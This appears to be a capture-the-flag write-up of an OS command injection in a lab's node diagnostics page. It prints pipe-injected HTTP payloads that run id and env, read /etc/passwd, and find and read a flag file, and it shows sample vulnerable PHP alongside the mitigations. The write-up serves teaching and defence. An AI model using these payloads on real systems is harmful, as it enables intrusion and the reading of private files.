---
title: "Command Injection Leads to Remote Code Execution | TheFallen"
date: 2026-07-01 10:55:00 +0530
categories: [A05 - Injection, Command Injection]
tags: [command-injection, rce, file-read, webverse, webverse-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/thefallen-command-injection.webp
  alt: TheFallen Command Injection blog cover
---

## Lab Link

[TheFallen](https://dashboard.webverselabs-pro.com/mystery-challenges/thefallen)

## Overview

TheFallen presented a node control panel with a **Node Diagnostics** feature. The application allowed an operator to run checks such as TLS certificate lookup, WHOIS, and DNS record lookup against a user-supplied target host.

The vulnerable endpoint was:

```http
POST /diagnostics.php HTTP/2
Content-Type: application/x-www-form-urlencoded

type=tls&target=<target-host>
```

The issue was that the `target` parameter was passed into an operating-system command without safe argument handling. By injecting a shell pipe character, the intended diagnostic command could be chained into arbitrary command execution.

## Objective

The goal was to identify the vulnerable input, confirm command execution, enumerate the local environment, locate the flag file, and read it from the server.

## Vulnerability Identification

- **OWASP Top 10:2025:** A05 - Injection
- **Vulnerability:** OS Command Injection
- **Impact:** Remote Code Execution and arbitrary local file read
- **Affected Endpoint:** `/diagnostics.php`
- **Affected Parameter:** `target`
- **Execution Context:** `ringo`

The diagnostics page exposed three check types:

- TLS Certificate
- WHOIS
- DNS Record

The form accepted a target host and returned command output inside the web page terminal. Since the feature was designed to execute backend diagnostics, the `target` input became the primary attack surface.

## Reconnaissance

The diagnostics page showed a terminal-style output area after each request:

```text
$ check tls
target: example.com
```

This suggested the backend was likely building a shell command from the selected check type and the supplied target.

A normal request looked like this:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=example.com
```

Because the `target` value was reflected into command output, the next step was to test whether shell metacharacters were interpreted.

## Exploitation

### 1. Confirming Command Execution

The first payload used a pipe character to append the `id` command:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=%7C+id
```

Decoded payload:

```text
| id
```

The server returned:

```text
uid=1112(ringo) gid=1112(ringo) groups=1112(ringo)
```

This confirmed that the `target` parameter was not being treated as a safe hostname. It was being interpreted by the shell, giving command execution as the `ringo` user.

### 2. Enumerating the Environment

After confirming execution, I checked environment variables:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=%7C+env
```

Decoded payload:

```text
| env
```

Useful output included:

```text
APACHE_RUN_USER=ringo
APACHE_RUN_GROUP=ringo
PWD=/var/www/html
PHP_VERSION=8.2.31
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

This confirmed the web application was running as the `ringo` user inside a PHP/Apache environment.

### 3. Reading Local System Files

To verify local file read capability, I read `/etc/passwd`:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=%7C+cat+%2Fetc%2Fpasswd
```

Decoded payload:

```text
| cat /etc/passwd
```

The output confirmed a local user named `ringo`:

```text
ringo:x:1112:1112::/home/ringo:/usr/sbin/nologin
```

This was a strong hint that user-specific files, including the flag, could be stored under `/home/ringo`.

### 4. Locating the Flag

I searched the filesystem for `flag.txt`:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=%7C+find+%2F+-name+%22flag.txt%22+2%3E%2Fdev%2Fnull
```

Decoded payload:

```bash
| find / -name "flag.txt" 2>/dev/null
```

The command revealed the flag path:

```text
/home/ringo/flag.txt
```

### 5. Reading the Flag

Finally, I read the discovered file:

```http
POST /diagnostics.php HTTP/2
Host: <redacted-lab-host>
Content-Type: application/x-www-form-urlencoded

type=tls&target=%7C+cat+%2Fhome%2Fringo%2Fflag.txt
```

Decoded payload:

```bash
| cat /home/ringo/flag.txt
```

## Proof of Exploitation

The server returned the flag from `/home/ringo/flag.txt`:

```text
WEBVERSE{.....}
```

The flag is intentionally redacted for the public writeup.

## Root Cause

The root cause was unsafe command construction. The application likely created a shell command by concatenating the diagnostic type and user-controlled target value directly into a command string.

A vulnerable implementation may look like this:

```php
$target = $_POST['target'];
$type = $_POST['type'];

if ($type === 'tls') {
    $output = shell_exec("openssl s_client -connect $target:443");
}
```

Because `$target` was not safely validated or passed as an argument, shell metacharacters such as `|`, `;`, `&&`, or backticks could change the meaning of the command.

## Impact

An attacker could abuse this vulnerability to:

- Execute arbitrary operating-system commands.
- Read sensitive files accessible to the web application user.
- Enumerate users, environment variables, and application paths.
- Extract secrets from configuration files.
- Pivot further if the process had access to internal services or credentials.

In this lab, command injection directly led to reading `/home/ringo/flag.txt`.

## Mitigation

### Avoid Shell Execution for Diagnostics

Where possible, avoid calling shell commands from web input. Use language-native libraries instead.

For example, DNS lookups can be performed with safe PHP functions:

```php
$records = dns_get_record($target, DNS_A);
```

### Strictly Validate Hostnames

The `target` value should be validated as a hostname or IP address before use:

```php
function is_valid_hostname($host) {
    return preg_match('/^(?=.{1,253}$)([a-zA-Z0-9-]{1,63}\.)*[a-zA-Z0-9-]{1,63}$/', $host);
}

if (!is_valid_hostname($target)) {
    http_response_code(400);
    exit('Invalid target');
}
```

This prevents shell metacharacters from being accepted as part of the target.

### Use Safe Argument Escaping

If a system command is absolutely required, never concatenate raw user input into the command. At minimum, use `escapeshellarg()`:

```php
$target = $_POST['target'];
$safeTarget = escapeshellarg($target);

$output = shell_exec("openssl s_client -connect {$safeTarget}:443 2>&1");
```

However, escaping should be treated as a last layer of defense, not the only protection.

### Apply Least Privilege

The web process should run with minimal filesystem and system privileges. Sensitive files should not be readable by the web application user unless required.

### Log and Alert on Suspicious Input

Inputs containing shell metacharacters should be rejected and logged:

```text
| ; & && || ` $() > <
```

Repeated attempts should trigger alerting or temporary blocking.

## Lessons Learned

- Diagnostic and admin tools often become high-risk attack surfaces because they intentionally interact with the operating system.
- Any feature that accepts a host, URL, filename, or command-like input should be reviewed for injection risk.
- Reflected terminal output is a strong signal that backend command execution may be happening.
- Confirming command injection with harmless commands such as `id` is a clean way to prove impact before moving to controlled file discovery.
- The most effective fix is to avoid shell execution entirely and use safe APIs with strict allowlist validation.
